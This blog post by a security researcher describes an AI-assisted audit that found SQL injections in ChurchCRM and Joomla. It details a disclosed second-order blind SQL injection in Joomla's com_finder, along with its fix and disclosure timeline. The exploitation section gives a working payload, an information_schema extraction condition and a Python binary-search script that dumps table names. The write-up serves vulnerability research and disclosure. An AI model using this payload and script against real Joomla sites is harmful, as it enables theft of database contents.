---
description: How a manual SQLi hunt turned into an AI-assisted Joomla audit and multiple assigned CVEs.
categories:
    - PHP
    - SQLI
    - Joomla
    - AI-Assisted Auditing
published: "2026-06-13"
---

# A Random PHP Detour

This whole journey started by me randomly finding a **CRM** repository written in **PHP** for managing churches called [ChurchCRM](https://github.com/ChurchCRM/CRM). In the [GitHub advisory history](https://github.com/ChurchCRM/CRM/security/advisories) were already a couple of interesting vulnerabilities reported like several **SQL injections**, **XSS** issues, and other typical web application bugs. Having a closer look at the **SQL injection** advisories, the vulnerable code looked to me fairly simple including some text book **SQL injections**. So I became curious whether there are more **SQL** related issues present in this repository and started having a look how this application interacts with the database. In [ChurchCRM](https://github.com/ChurchCRM/CRM) this turned out quite easy. A lot of legacy code constructs raw **SQL** strings and then passes them into the `RunQuery` function which delegates the query execution to the underlying database. That gives you a pretty simple source-to-sink search strategy. By just searching for `RunQuery` and inspecting the code constructing the **SQL** query, you can manually trace all the relevant variables backwards. One representative example for this is the vulnerable code in [ChurchCRM 7.0.5 SettingsUser.php](https://github.com/ChurchCRM/CRM/blob/7.0.5/src/SettingsUser.php#L14-L47):

```php
if (isset($_POST['save'])) {
    $new_value = $_POST['new_value'];
    $new_permission = $_POST['new_permission'];
    $type = $_POST['type'];
    ksort($type);
    reset($type);
    while ($current_type = current($type)) {
        $id = key($type);

        // ...

        $sSQL = 'UPDATE userconfig_ucfg '
            . "SET ucfg_value='$value', ucfg_permission='$permission' "
            . "WHERE ucfg_id='$id' AND ucfg_per_id='0' ";
        $rsUpdate = RunQuery($sSQL);
        next($type);
    }
}
```

It's quite easy to see that this implementation is vulnerable to **SQL injection** due to the missing sanitization of `$_POST['type']` and thus also `$id` which is directly placed into the `WHERE` clause of the **SQL** query. This became [CVE-2026-39325](https://github.com/ChurchCRM/CRM/security/advisories/GHSA-cf68-g7vf-9xrq) among several other **SQL injections** I reported. In this repository the common theme was not just some missing sanitizer. A lot raw **SQL** strings were used with just partial filtering, custom sanitizer functions used in a wrong way, and almost no usage of prepared statements.

After reporting to [ChurchCRM](https://github.com/ChurchCRM/CRM) everything I found, I wanted to know if the same workflow can be applied to more popular, larger and better reviewed codebase. At first I found another interesting looking **CRM** called [SuiteCRM](https://github.com/SuiteCRM/SuiteCRM), and after reporting a bunch of **SQL injections** there, which have not been resolved yet, I went over to [Joomla](https://github.com/joomla/joomla-cms) which is a **CMS** like [WordPress](https://wordpress.com/) but not as popular. However [Joomla](https://github.com/joomla/joomla-cms) got more than **5k** GitHub stars and a large amount of legacy **PHP** code with about **250k PHP** code lines in total in the tagged [Joomla 5.4.5](https://github.com/joomla/joomla-cms/tree/5.4.5).

# Turning Manual Review Into An AI Workflow

The workflow which I applied manually to [ChurchCRM](https://github.com/ChurchCRM/CRM) felt mechanical enough to automate parts of it with AI agents. I was using **Codex 5.3** at the time. To use any **OpenAI** models for security research, you have to go through a verification flow at [chatgpt.com/cyber](https://chatgpt.com/cyber) which is fairly straightforward. You just have to explain what you want to do with the models, provide some information about yourself, and link something like your LinkedIn profile or personal website.

## How Joomla Interacts With The Database

The way [Joomla](https://github.com/joomla/joomla-cms) implements database interaction is by using a database abstraction layer, a query builder, and table/model classes. So by instructing an agent to search for specific function calls, it was possible to discover potentially vulnerable **SQL** sinks:

- `getQuery` finds the query-builder construction. This is where **SQL** structure usually starts being assembled, as in [SearchModel::getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L154-L158):
```php
$db    = $this->getDatabase();
$query = $db->getQuery(true);
```

- `setQuery` finds the handoff to the database driver. There might be cases where the query was built somewhere else and executed later, for example in [BaseDatabaseModel::_getList()](https://github.com/joomla/joomla-cms/blob/5.4.5/libraries/src/MVC/Model/BaseDatabaseModel.php#L161-L164):
```php
$this->getDatabase()->setQuery($query);
return $this->getDatabase()->loadObjectList();
```

- `getDatabase` finds the modern database access. It shows where a class obtains the database handle before building or executing queries, for example in the finder content plugin's [getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/plugins/finder/content/src/Extension/Content.php#L379-L385):
```php
$db = $this->getDatabase();
$query = $query instanceof QueryInterface ? $query : $db->getQuery(true);
```

- `Factory::getDbo` finds older legacy database access. It is deprecated in [Joomla 5.4.5](https://github.com/joomla/joomla-cms/tree/5.4.5), but still appears in helper functions, for example [CMSHelper::getLanguageId()](https://github.com/joomla/joomla-cms/blob/5.4.5/libraries/src/Helper/CMSHelper.php#L80-L89):
```php
$db    = Factory::getDbo();
$query = $db->getQuery(true);
$db->setQuery($query);
```

To avoid that any of these searches produce duplicate sinks, the next logical step was to have the agent remove duplicates and keep reducing the candidate list further.

## Removing Safe Sinks

After removing duplicates, the broad search still had a lot of sinks that are not worth deeper analysis. From there, the agent had to keep only candidates where any of the used parameters is derived dynamically for example by concatenation or interpolation of variables. The agent also had to check how the query uses prepared statements. [Joomla](https://github.com/joomla/joomla-cms) commonly uses for dynamic values **SQL** parameter placeholders like `:id`, `:username`, or `?`, and then binds the real **PHP** value separately, for example in [UserGroupsHelper::getTitle()](https://github.com/joomla/joomla-cms/blob/5.4.5/libraries/src/Helper/UserGroupsHelper.php#L229-L233):

```php
$query = $db->getQuery(true)
    ->select('*')
    ->from($db->quoteName('#__usergroups'))
    ->where($db->quoteName('id') . ' = :id')
    ->bind(':id', $id, ParameterType::INTEGER);
```

Even if `$id` came from an attacker, it is not copied into the **SQL** text as syntax. A correctly bound value placeholder protects that specific value from becoming **SQL** grammar. However the whole query can still be unsafe if another attacker-controlled value is concatenated without a prepared statement into the **SQL** structure, for example an `ORDER BY` column, a sort direction, a table name, a column name, a raw `LIMIT` fragment, or a manually built `IN (...)` list.

So basically the filtering rules were:

- Remove fully static queries as hardcoded queries can't be influenced by any attacker
- Remove all dynamic queries that apply for every dynamic input prepared statements

The important output of this phase was a **JSON** file `sinks.json`, which contains the remaining candidates with different information like the file name and line number where the used keyword was found, which variables are dynamic and more:

```json
{
    "file": "components/com_finder/src/Model/SearchModel.php",
    "class": "SearchModel",
    "function": "getListQuery",
    "line": 158,
    "full_query_logics": [
        "<line-number>: <code>",
    ],
    "dynamic_inputs": [
        "$groups",
        "$this->searchquery->filters",
        "$group",
        "$taxonomies",
        "$ordering",
        "$direction"
    ]
}
```

After removing duplicates, static queries, and queries where all dynamic values were safely bound, **247** entries remained in `sinks.json`.

## Deep Inspection Of The Remaining Sinks

After these filtering steps, the remaining candidates are all potentially vulnerable sinks worth some deeper analysis. The next step was to automate the focused analysis by giving an agent one candidate at a time.

In short the instructions I gave to the agents looked like the following:

- Prove external reachability before calling anything a vulnerability e.g. via the UI with any user privileges (except for super user), API, etc
- Identify the concrete source with its web route, propagation path, sink, and **SQL** context
- Inspect transformations such as trimming, escaping, encoding, decoding, type coercion, and more
- Treat any stored attacker controlled values as untrusted

I also gave the agent the opportunity to dynamically test against a locally running [Joomla](https://github.com/joomla/joomla-cms) Docker environment so the agent could also produce working POCs to prove any vulnerabilities. After iterating over all the candidates, which actually took a couple of days, **Codex** found several interesting issues. I thoroughly analyzed the results of every claimed vulnerability and two of them caught my attention. After a comprehensive review of these bugs, improving the POCs and writing a detailed report, I sent every necessary information related to these vulnerabilities to the [Joomla! Security Strike Team](https://developer.joomla.org/security.html), and each of the reports resulted in a CVE:

- [CVE-2026-35221](https://developer.joomla.org/security-centre/1038-20260506-core-authenticated-blind-sqli-in-com-finder.html), authenticated blind SQLi in `com_finder`.
- [CVE-2026-35222](https://developer.joomla.org/security-centre/1039-20260507-core-authenticated-blind-sqli-in-com-tags.html), authenticated blind SQLi in `com_tags`.

Both are **second-order SQL injections**. Below I focus on the one in `com_finder`.

# The Vulnerability In com_finder

Some [Joomla](https://github.com/joomla/joomla-cms) terminology is worth an explanation before going into the source-to-sink trace:

- A **component** is the main application unit behind a request. In e.g. `index.php?option=com_finder&view=search`, the `option=com_finder` selects the **Smart Search** component and `view=search` selects the search view/model
- **Finder** is [Joomla](https://github.com/joomla/joomla-cms)'s **Smart Search** system. It builds its own search index instead of querying articles directly for every search request

The short version of the bug is:

- An authenticated content user stores text as the title of a **Finder** taxonomy node
- A later public **Finder** search loads that stored title by prefix
- [Joomla](https://github.com/joomla/joomla-cms) accidentally stores the title as an array key instead of a value
- `SearchModel::getListQuery` later treats that key as a numeric taxonomy id and concatenates it into `IN (...)` without any sanitization

## Storing The Payload

The whole exploitation process starts with the article `created_by_alias` field which is the **Created by Alias** metadata field for articles. It lets an author display another author's name instead of the account name. A user with enough content permissions, for example the **Publisher** role with `core.create` and `core.edit.state` privileges, can create a published article and set this field. If the user cannot publish directly, the value can still become a second-order payload, but it needs another workflow step of another authorized user to publish or index the content.

![Publisher article form with the SQLi payload in Created by Alias](blog/posts/joomla-sqli/publisher-created-by-alias-browser.png "Publisher Created by Alias payload")

When saving an article, [ArticleModel::save()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_content/src/Model/ArticleModel.php#L657-L668) only applies `TRIM` to `created_by_alias` which is in our case `13371337*0+IF((1=1),t.node_id,0)`:

```php
if (isset($data['created_by_alias'])) {
    $data['created_by_alias'] = $filter->clean($data['created_by_alias'], 'TRIM');
}
```

So after saving the article, the attacker-controlled value is still the same value, except for leading and trailing whitespace. [Joomla](https://github.com/joomla/joomla-cms)'s content event plugin starts the **Finder** indexing through [onContentAfterSave()](https://github.com/joomla/joomla-cms/blob/5.4.5/plugins/content/finder/src/Extension/Finder.php#L72-L81). That handler imports the `finder` plugin group and dispatches `onFinderAfterSave`. The Finder content plugin receives that event, calls `reindex($row->id)`, and the inherited adapter logic eventually calls this plugin's `getListQuery()` to reload the saved article for indexing.

The query explicitly selects `a.created_by_alias` in [Content::getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/plugins/finder/content/src/Extension/Content.php#L384-L388):

```php
->select('a.created_by_alias, a.modified, a.modified_by, a.attribs AS params')
```

In the following step, the **Finder** content plugin turns article metadata into **Smart Search** taxonomy metadata. In [plugins/finder/content/src/Extension/Content.php](https://github.com/joomla/joomla-cms/blob/5.4.5/plugins/finder/content/src/Extension/Content.php#L339-L342), it adds an `Author` taxonomy node like this:

```php
if (\in_array('author', $taxonomies) && (!empty($item->author) || !empty($item->created_by_alias))) {
    $item->addTaxonomy('Author', !empty($item->created_by_alias) ? $item->created_by_alias : $item->author, $item->state);
}
```

`Author` is the taxonomy branch. The second argument is the taxonomy title. `Result::addTaxonomy` then receives these arguments as `$branch` and `$title` in [Result.php](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Result.php#L395-L414):

```php
public function addTaxonomy($branch, $title, $state = 1, $access = 1, $language = '*')
{
    // ...
    $node           = new \stdClass();
    $node->title    = $title;
    // ...
    $this->taxonomy[$branch][] = $node;
}
```

Later, [Taxonomy::storeNode()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Taxonomy.php#L205-L210) copies that title into the Finder taxonomy table row:

```php
$nodeTable->title    = $node->title;
$nodeTable->access   = (int) $node->access;
$nodeTable->language = $node->language;
```

So the write-side path is:

1. The article form stores the payload in `$data['created_by_alias']`
2. **Finder** reloads the saved article and exposes the same value as `$item->created_by_alias`
3. The content plugin passes it into `addTaxonomy('Author', $item->created_by_alias, ...)`
4. Inside `Result::addTaxonomy`, this second argument becomes the `$node->title`
5. `Taxonomy::storeNode` copies `$node->title` into `$nodeTable->title`
6. The table object persists it as `#__finder_taxonomy.title`

At this point the attacker-controlled value is persistent in the database.

## Loading The Stored Title

The trigger is a frontend **Finder** search request. The `q` parameter is the **Smart Search** query string, and `author:<prefix>` is **Finder's** modifier syntax for filtering by the `Author` taxonomy branch:

```text
GET /index.php?option=com_finder&view=search&q=<article-title>+author:<prefix>
```

[SearchModel.php::populateState()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L472-L511) reads `q` with `getString()` and creates a **Finder** query object:

```php
$options['input'] = $input->getString('q', $params->get('q', ''));
$this->searchquery = new Query($options, $this->getDatabase());
```

Inside [Query::processString()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L734-L764), Joomla builds modifier patterns from the Finder taxonomy branch titles:

```php
foreach (Taxonomy::getBranchTitles() as $branch) {
    $patterns[$branch] = StringHelper::strtolower(Text::_(LanguageHelper::branchSingular($branch)));
}
```

The `Author` branch matches the search modifier `author:<value>`. After the regex match in [Query::processString()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L793-L843), the relevant variables are set as `$modifier = 'Author'` and `$value = '13371337'`. [Joomla](https://github.com/joomla/joomla-cms) then loads the taxonomy node by prefix:

```php
$return = Taxonomy::getNodeByTitle($modifier, $value);
```

[Taxonomy::getNodeByTitle()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Taxonomy.php#L345-L368) searches the `Author` branch and matches the stored title with `LIKE '<prefix>%'`:

```php
public static function getNodeByTitle($branch, $title)
{
// ...
->where('t1.title LIKE ' . $db->quote($db->escape($title) . '%'))
->where('t2.title = ' . $db->quote($branch));
// ...
}
```

The lookup itself safely quotes and escapes the prefix in a `LIKE` query to make sure it is not possible to escape out of the string context, and returns the matching row.

## The Key/Value Mix-up

The vulnerable code is directly afterwards, in [Query::processString()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L829-L843):

```php
if ($return) {
    // ...
    $this->filters[$modifier][$return->title] = (int) $return->id;
}
```

The key becomes the malicious stored taxonomy **title**, and the value becomes the integer taxonomy **id**. But the later query-building code expects the opposite data shape with the numeric taxonomy ids as array keys. Static filters in the same class already use that shape, for example in [Query.php::processStaticTaxonomy()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L568-L570).

## The Sink

The sink is in [SearchModel::getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L192-L203):

```php
if (!empty($this->searchquery->filters)) {
    $groups     = array_values($this->searchquery->filters);
    $taxonomies = array_merge(...array_map(fn ($group) => array_keys($group), $groups));

    $query->join('INNER', $db->quoteName('#__finder_taxonomy_map') . ' AS t ON t.link_id = l.link_id')
        ->where('t.node_id IN (' . implode(',', array_unique($taxonomies)) . ')');

    foreach ($groups as $group) {
        $query->having('SUM(CASE WHEN t.node_id IN (' . implode(',', array_keys($group)) . ') THEN 1 ELSE 0 END) > 0');
    }
}
```

At this point the relevant object state looks like this, where `123` is an example id for the **Finder** taxonomy node:

```php
$this->searchquery->filters = [
    'Author' => [
        '13371337*0+IF((1=1),t.node_id,0)' => 123,
    ],
];
```

Later in `array_keys($group)` [Joomla](https://github.com/joomla/joomla-cms) expects the array key to be the numeric taxonomy id, but because of the earlier assignment the key is the malicious stored taxonomy title. The [implode()](https://www.php.net/implode) turns the payload into raw **SQL** by joining the array elements with a string, so the malicious title is just inserted into the expression context. The generated query then contains a fragment like this:

```sql
SUM(CASE WHEN t.node_id IN (13371337*0+IF((1=1),t.node_id,0)) THEN 1 ELSE 0 END) > 0
```

# Exploitation

The payload `13371337*0+IF((1=1),t.node_id,0)` was created to work exactly in this numeric expression context. The individual parts are:

- `13371337` is just a random numeric marker. The public search later uses e.g. `author:13371337`, so the prefix lookup loads the full stored taxonomy title with `LIKE '13371337%'`
- `*0` makes the marker contribute literally `0` to the expression. This lets the payload start with the searchable numeric prefix without changing the result of the following `IF(...)` expression
- `IF((1=1),t.node_id,0)` is a **MySQL** conditional expression. For real extraction, the `1=1` test is replaced with a valid boolean condition, for example `ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0),1,1)) >= 109`. This reads the first character of the first table name in the current database, converts it to its ASCII number, and checks whether that number is at least `109` which corresponds to the ASCII character `m`. By using this we can dump for example the table names.
- `t.node_id` comes from [Joomla](https://github.com/joomla/joomla-cms)'s own query. Because the payload is wrapped with `t.node_id IN (...)`, it returns either the current `t.node_id` or `0` depending on the condition.

This turns the search result page into a boolean oracle.

Triggering a `True` condition by creating an article with alias `13371337*0+IF((1=1),t.node_id,0)` will look like:

![Finder search returning results for the true SQL condition](blog/posts/joomla-sqli/finder-search-true-browser.png "Finder true condition")

The `False` condition just returns nothing via the search filter after creating an article with alias `73317331*0+IF((1=0),t.node_id,0)`:

![Finder search returning no results for the false SQL condition](blog/posts/joomla-sqli/finder-search-false-browser.png "Finder false condition")

The very simplified extraction script to dump the database table names looks like this:

```python
def cond(table_offset, pos, mid):
    return (
        "ASCII(SUBSTRING((SELECT table_name "
        "FROM information_schema.tables "
        "WHERE table_schema=DATABASE() "
        f"ORDER BY table_name LIMIT 1 OFFSET {table_offset}),{pos},1))>={mid}"
    )

for pos in range(1, 65):
    lo, hi = 0, 127
    search_term = "1337"

    while lo < hi:
        mid = (lo + hi + 1) // 2
        alias_payload = f"{prefix}*0+IF(({cond(0, pos, mid)}),t.node_id,0)"

        save_article_created_by_alias(alias_payload)
        ok = finder_search_returns_results(f"{search_term} author:{prefix}")

        if ok:
            lo = mid
        else:
            hi = mid - 1
```

`search_term` just has to be a normal indexed word from the published article, while `author:<prefix>` triggers the vulnerable taxonomy filter. Then we basically do a binary search to extract table names character by character through the boolean oracle.

# The Fix

The vulnerability is a typical second-order bug, although it also relies on a logical bug and a broken contract between [Query::processString()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L843) and [SearchModel::getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L193-L194). `Query::processString` creates `title => id`, while `SearchModel::getListQuery` expects `id => title`.

The fix in [Joomla 5.4.6](https://github.com/joomla/joomla-cms/tree/5.4.6) is small and targets the key/value bug directly. In [Query.php on tag 5.4.6](https://github.com/joomla/joomla-cms/blob/5.4.6/administrator/components/com_finder/src/Indexer/Query.php#L842-L843), the filter map is changed to store the integer id as the key and the taxonomy title as the value:

Before:

```php
$this->filters[$modifier][$return->title] = (int) $return->id;
```

After:

```php
$this->filters[$modifier][(int) $return->id] = $return->title;
```

Additionally the integer cast is part of the sanitization strategy against **SQL** injections and also commonly seen in [Joomla](https://github.com/joomla/joomla-cms) and other software written in **PHP**.

# Final Thoughts

Before falling into this rabbit hole, I did not really expect **SQL injections** to still be this common in large applications. But it makes sense. Many old codebases were written before prepared statements became popular. During that time these code bases added their own sanitizer functions, query builders, and table abstractions. Rewriting all of that is very time consuming. Moreover prepared statements cannot solve everything in a framework like [Joomla](https://github.com/joomla/joomla-cms). They are the right tool for values, but not for every dynamic **SQL** fragment. Sort orders, column names, table names, aliases, and raw expressions still need strict whitelisting, hardcoded mappings, type normalization, or other structural controls.

To my surprise the workflow with AI worked pretty well after splitting the task into reviewable units:

- enumerate concrete sinks
- remove clearly safe ones
- give the agent one sink at a time
- force source-to-sink tracing
- require runtime proof
- manually verify the result before reporting

This kind of workflow should be applicable to every vulnerability type. But I think it works especially well for **SQL injections**, because the potentially vulnerable sinks are quite easy to find using simple keywords, as explained in [section 2.1](#how-joomla-interacts-with-the-database). My guess is that vulnerabilities like **XSS** are harder to find with this workflow, because there are many different ways to execute **JavaScript**. On top of that, **JavaScript** code often has many different variations how user-controlled input could end up being executed in another user's browser.

# Disclosure Timeline

The [Joomla advisory](https://developer.joomla.org/security-centre/1038-20260506-core-authenticated-blind-sqli-in-com-finder.html) classifies the `com_finder` issue with **Impact: High**, **Severity: Moderate**, **Probability: Moderate**, and **Exploit type: SQLi**. [Joomla](https://github.com/joomla/joomla-cms) uses its own advisory fields here and does not publish a **CVSS** score or vector for this entry. I read the rating as: the impact is high because blind **SQL injection** can expose database contents, but the practical severity and probability are lower because exploitation needs an authenticated user with publisher privileges, a stored second-order payload, Finder indexing, and blind extraction through search-result differences.

The disclosure timeline for the two Joomla **SQL injection** reports looked like this:

- **2026-03-31:** Reported the `com_finder` and `com_tags` issues to the Joomla Security Strike Team.
- **2026-04-01:** First acknowledgment.
- **2026-04-11:** Confirmation of the issues and initial patch development.
- **2026-05-26:** Fixed in Joomla CMS **5.4.6** and **6.1.1** and [CVE-2026-35221](https://www.cve.org/CVERecord?id=CVE-2026-35221) and [CVE-2026-35222](https://www.cve.org/CVERecord?id=CVE-2026-35222) assigned.
